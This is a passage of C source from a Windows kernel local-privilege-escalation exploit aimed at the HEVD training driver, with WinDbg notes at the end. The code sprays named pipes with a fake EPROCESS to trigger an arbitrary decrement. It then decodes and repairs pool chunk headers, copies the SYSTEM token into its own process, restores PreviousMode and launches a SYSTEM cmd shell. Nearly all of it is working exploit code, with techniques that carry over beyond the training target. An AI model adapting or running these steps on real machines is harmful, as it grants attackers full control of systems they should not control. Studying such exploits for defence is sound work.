    char fake_eprocess_buf[0x1000] = { 0 };
    setupFakeEprocess(fake_eprocess_buf, addr_to_decrement);

    printf("[*] Allocating fake EPROCESS\n");
    uintptr_t fake_eprocess = allocFakeEprocess(&hack_pipe, &ghost_pipe, fake_eprocess_buf);

    printf("[+] Fake EPROCESS address: 0x%llX\n\n", fake_eprocess);

    if (!fake_eprocess)
    {
        printf("Error allocating fake Eprocess object\n");
        return -1;
    }

    printf("Enable Hack Lookaside again\n");

    EnableLookaside(maliciousPayload, SPRAY_LOOKASIDE_HACK_HEAP, NUM_PIPES_ENABLE_LOOOKASIDE_HACK);

    puts("[*] Spraying pipes with fake ProcessBilled...");
    setFakeProcessBilled(&hack_pipe, &ghost_pipe, fake_eprocess, vuln_object_index);
 

    printf("[*] Freeing ghost chunk to trigger arbitrary decrement\n");
    ULONG dwBytes = 0;

    char* restoreBuffer = (char*)malloc(1);
    *restoreBuffer = 1;


    printf("[***] 16. Trigger arbitrary decrement\n\n");

    system("pause");

    triggerArbitraryDecrement(&ghost_pipe, GhostPipeIndex);

   
    //Write64(self_eprocess + eprocess_token_offset, system_eprocess + eprocess_token_offset);

    //cleanup - fix headers

    //printf("[***] 16. cleanup - fix VS headers\n");

    /* We need to keep the ghost chunk and fix the previous and the next chunk. The distance from the ghost chunk
    to the previous chunk is 0x50. The distance from the ghost chunk to the next chunk is 0x440 - 0x50*/
    /*
    #define PREV_CHUNK_OFFSET ALL_HEADERS
    #define NEXT_CHUNK_OFFSET SPRAY_SIZE_GHOST_CHUNK
*/

    printf("[***] 17. Fix VS headers\n");
    uint64_t new_encoded_vs_header[2] = { 0 };
    DWORD64 prevVsChunk = GhostChunkPointer - PREV_CHUNK_OFFSET;
    printf("[+] prevVsChunk: 0x%llX\n", prevVsChunk);

    HEAP_VS_CHUNK_HEADER* new_vs_header = NULL;

    new_encoded_vs_header[0] = Read64(prevVsChunk);
    new_encoded_vs_header[1] = Read64(prevVsChunk+0x8);

    //decode
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ prevVsChunk ^ nt_RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ prevVsChunk ^ nt_RtlpHpHeapGlobals;
 
    //modify header
    new_vs_header = (HEAP_VS_CHUNK_HEADER*)new_encoded_vs_header;
    new_vs_header->UnsafeSize = PREV_CHUNK_OFFSET / 0x10; //fix size of the chunk
    printf("[+] new_vs_header->UnsafeSize: 0x%llX\n", new_vs_header->UnsafeSize);

    //encode
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ prevVsChunk ^ nt_RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ prevVsChunk ^ nt_RtlpHpHeapGlobals;

    //restore overwritten VS chunk header of the previous chunk
    pNtWriteVirtualMemory(GetCurrentProcess(), (PVOID)prevVsChunk, (PVOID)new_encoded_vs_header, sizeof(HEAP_VS_CHUNK_HEADER), &dwBytes);


    //repair next chunk VS header

    memset(new_encoded_vs_header, 0x0, sizeof(HEAP_VS_CHUNK_HEADER));

    DWORD64 nextVsChunk = GhostChunkPointer + NEXT_CHUNK_OFFSET;
    printf("[+] nextVsChunk: 0x%llX\n", nextVsChunk);

    new_encoded_vs_header[0] = Read64(nextVsChunk);
    new_encoded_vs_header[1] = Read64(nextVsChunk + 0x8);

    //decode
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ nextVsChunk ^ nt_RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ nextVsChunk ^ nt_RtlpHpHeapGlobals;

    //modify header
    new_vs_header = (HEAP_VS_CHUNK_HEADER*)new_encoded_vs_header;
    new_vs_header->UnsafePrevSize = (NEXT_CHUNK_OFFSET) / 0x10; //fix size of the chunk
    //new_vs_header->Allocated = 1;
    printf("[+] new_vs_header->UnsafePrevSize: 0x%llX\n", new_vs_header->UnsafePrevSize);

    //encode
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ nextVsChunk ^ nt_RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ nextVsChunk ^ nt_RtlpHpHeapGlobals;



    //restore overwritten VS chunk header of the previous chunk

    pNtWriteVirtualMemory(GetCurrentProcess(), (PVOID)nextVsChunk, (PVOID)new_encoded_vs_header, sizeof(HEAP_VS_CHUNK_HEADER), &dwBytes);

    

    closeHandles(vuln_object_index, SPRAY_RECLAIM_HACK);
    closeHandles(GhostPipeIndex, SPRAY_RECLAIM_GHOST);

    //swap tokens
    printf("[***] 18. Swap security tokens\n\n");
    pNtWriteVirtualMemory(GetCurrentProcess(), (PVOID)((ULONGLONG)self_eprocess + eprocess_token_offset), (PVOID)((ULONGLONG)system_eprocess + eprocess_token_offset), sizeof(ULONGLONG), &dwBytes);

    printf("[***] 19. Restore previous mode\n\n");
  
    pNtWriteVirtualMemory(GetCurrentProcess(), (PVOID)((ULONGLONG)self_kthread + kthread_previous_mode_offset), (PVOID)restoreBuffer, sizeof(char), &dwBytes);
    
   

    system("cmd");

    //11. Check the result and close the handle
    // ----------------------------------------
    if (bResult) {
        printf("[+] DeviceIoControl completed successfully (DoS or Exploitation may have occurred).\n");
    }
    else {
        // A failed DeviceIoControl often means the driver crashed (Denial of Service)
        printf("[-] ERROR: DeviceIoControl failed. GetLastError: %lu (This often indicates a crash/DoS).\n", GetLastError());
    }

    CloseHandle(hDevice);
    printf("[*] Handle closed.\n");

    if (!VirtualFree(maliciousPayload, 0, MEM_RELEASE)) {
        printf("VirtualFree failed! Error: %lu\n", GetLastError());
    }

    free(restoreBuffer);

    return bResult;
}




int main() {
    printf("--- Starting LPE POOL OVERFLOW exploit ---\n\n");
    SetProcessAffinityMask(GetCurrentProcess(), 0x1); // Pin to CPU 0
    SetThreadAffinityMask(GetCurrentThread(), 0x1);


    TriggerHEVDVulnerability();

    // Note: If the exploit is successful, the command prompt (cmd.exe) 
    // may crash or a SYSTEM shell will be spawned, depending on the payload.
    // system("pause"); 
    return 0;
}

/*


!poolfind NpFr
!poolused 1 NpFr


bp HEVD+0x862ea -> before memmove
bp HEVD+0x862EF  -> after memmove
bp HEVD+0x8635F    -> After free (overlapping chunk)


*/
